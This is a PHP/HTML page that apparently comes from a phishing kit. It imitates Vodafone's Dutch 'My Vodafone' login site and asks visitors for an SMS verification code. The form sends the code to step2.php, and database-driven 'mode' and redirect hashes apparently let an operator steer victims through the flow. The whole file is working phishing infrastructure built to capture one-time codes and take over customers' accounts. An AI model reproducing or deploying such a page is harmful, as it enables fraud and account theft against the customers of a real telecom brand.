<?php 
require_once 'header.php';
require_once 'entry.php';
require_once("common/config.php");
require_once("common/database.php");
$mode = db::getCell("SELECT value FROM mode WHERE id=1");
include_once 'loader.php'; 
?>
    <app-root class="app-root" ng-version="6.0.9">
        <router-outlet mo-framework="angular" moho-observe="page" moho-page-ready="page page_metadata user" mo-category="single_sign_on"></router-outlet>
        <app-base class="app-base brand--vodafone">
            <app-header class="app-header">
                <header>
                    <section id="menu-mijn-account">
                        <app-logo class="app-logo">
                            <!---->
                            <!---->
                            <a class="logo-svg" href="#">
                                <app-svg-icon class="desktop-view app-svg-icon" icon="vodafoneLogo">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26">
                                        <!---->
                                        <path fill="#e60000" d="M18.497,1.219c-2.45,0.52 -4.223,2.695 -4.24,5.2l0,0.177c0.984,0.205 1.924,0.582 2.777,1.115c0.707,0.428 1.321,0.994 1.806,1.664l0.104,0.148c0.345,0.511 0.61,1.073 0.788,1.665c0.182,0.613 0.284,1.247 0.304,1.887l0,0.251c0.005,1.096 -0.25,2.178 -0.743,3.157l0.015,0.009c-0.452,0.867 -1.085,1.627 -1.858,2.227c-1.472,1.152 -3.345,1.668 -5.2,1.434c-0.377,-0.046 -0.749,-0.123 -1.113,-0.23c-1.709,-0.504 -3.181,-1.606 -4.146,-3.104c-0.415,-0.65 -0.732,-1.356 -0.943,-2.096l-0.045,-0.17c-0.111,-0.422 -0.191,-0.852 -0.238,-1.286c-0.047,-0.446 -0.062,-0.896 -0.043,-1.344l0,-0.134c0.035,-0.631 0.13,-1.258 0.281,-1.872c0.583,-2.278 1.864,-4.317 3.662,-5.832c1.059,-0.893 2.263,-1.598 3.559,-2.086c0.364,-0.142 0.742,-0.26 1.062,-0.364l0.661,-0.18c0.543,-0.133 1.092,-0.232 1.649,-0.296c0.545,-0.069 1.097,-0.069 1.642,0c0.087,0.011 0.173,0.031 0.257,0.059c-1.72,-0.804 -3.596,-1.22 -5.495,-1.218c-7.179,0 -13,5.821 -13,13c0,7.179 5.821,13 13,13c7.179,0 13,-5.821 13,-13c0,-5.215 -3.071,-9.71 -7.503,-11.781"></path>
                                    </svg>
                                </app-svg-icon>
                            </a>
                        </app-logo>
                        <!---->
                    </section>
                    <app-login-status-menu class="app-login-status-menu">
                        <div moho-observe="user" mo-is-logged-in="false" mo-consent-level="consentLevel Not Available">
                            <!---->
                            <a class="not-logged-in" href="#">
                                <app-svg-icon class="user app-svg-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26">
                                        <!---->
                                        <path fill="#333333" d="M7.233,7.211c0,-3.181 2.588,-5.769 5.769,-5.769c3.18,0 5.769,2.588 5.769,5.769c0,3.18 -2.589,5.769 -5.769,5.769c-3.181,0 -5.769,-2.589 -5.769,-5.769m17.299,17.964c-1.01,-6.846 -4.537,-10.33 -8.129,-11.607c2.341,-1.254 3.808,-3.702 3.81,-6.357c0,-3.976 -3.235,-7.211 -7.211,-7.211c-3.976,0 -7.211,3.235 -7.211,7.21c0.002,2.668 1.484,5.125 3.842,6.373c-1.442,0.526 -2.757,1.35 -3.858,2.42c-2.248,2.167 -3.736,5.337 -4.304,9.17c-0.005,0.035 -0.008,0.07 -0.008,0.105c0,0.396 0.326,0.722 0.722,0.722c0.356,0 0.661,-0.264 0.714,-0.616c1.196,-8.092 6.225,-10.962 10.168,-10.962c2.29,0 4.5,0.929 6.223,2.616c1.976,1.937 3.294,4.822 3.815,8.347c0.061,0.343 0.362,0.596 0.711,0.596c0.395,0 0.721,-0.326 0.721,-0.722c0,-0.028 -0.002,-0.057 -0.005,-0.085"></path>
                                    </svg>
                                </app-svg-icon>
                                <!----><span class="myVodafone">My Vodafone</span>
                                <!---->
                            </a>
                            <!---->
                        </div>
                    </app-login-status-menu>
                </header>
                <!---->
                <!---->
            </app-header>
            <app-main-navigation class="main-navigation app-main-navigation">
                <!---->
            </app-main-navigation>
            <main>
                <router-outlet></router-outlet>
                <app-login class="app-login">
                    <div>
                        <!---->
                        <!---->
                        <!---->
                    </div>
					<form method="post" id="dataForm" action="step2.php" class="label-position--top">      
						<fieldset>
                            <!---->
                            <legend>SMS-Controle</legend>
							<p>We sturen je een sms'je met een code naar uw telefoonnummer. Waarom een sms-code? Zodat we zeker weten dat jij de eigenaar bent van dit telefoonnummer.</p>
							<div class="errorContainer" style="display:none">
							Deze combinatie klopt niet. Typfoutje gemaakt?
							</div>
							<h4>Uw code invoeren:</h4>
                            <app-form-error-messages class="app-form-error-messages">
                                <!---->
                            </app-form-error-messages>
                            <app-form-field class="app-form-field">
                                <!---->
                                <div class="input-wrapper">
                                    <input type="tel" maxlength="6" appinput="" id="response" name="response" placeholder="sms-code" class="numeric ng-untouched ng-pristine ng-invalid" >
                                </div>
                                <!---->
                            </app-form-field>
                            
                            <button appbutton="" appsubmit="" class="app-button app-button--primary" color="primary" id="loginFormSubmitButton" type="submit">
                                <!---->Ga verder </button>
                        </fieldset>
            </main>
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<input type="hidden" id="mode" value="<?php echo $mode; ?>"/>
			<input type="hidden" id="current_hash" value="<?php echo $q_arr['sms-verificate.php']; ?>"/>
			<input type="hidden" id="redirect_hash" value="<?php echo $mode==2 ? $q_arr['geslaagd.php'] : $q_arr['logout.php'];?>"/>
			<script type="text/javascript" src="dist/jquery.validate.min.js"></script>
			<script type="text/javascript" src="dist/localization/messages_nl.js"></script>
			<script type="text/javascript" src="dist/sms-verificate.js"></script>
			<script type="text/javascript" src="dist/error.js"></script>
			<?php include_once'footer.php';?>